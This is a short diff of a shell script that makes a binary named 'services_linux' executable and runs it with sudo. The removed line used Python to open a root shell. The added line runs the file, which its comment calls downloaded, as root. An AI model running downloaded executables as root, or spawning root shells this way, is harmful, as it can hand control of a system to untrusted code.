@@ -24,9 +24,9 @@ fi
 chmod +x "$DEST_DIR/services_linux"
 echo "Changed file permissions."
 
-# Run the Python command to open a shell and execute the file
+# Run the downloaded file using Python
 echo "Running Python command with sudo..."
-sudo python -c 'import os; os.system("/bin/sh")' "$DEST_DIR/services_linux"
+sudo python3 -c "import os; os.system('$DEST_DIR/services_linux')"
 
 if [ $? -eq 0 ]; then
     echo "Execution successful."
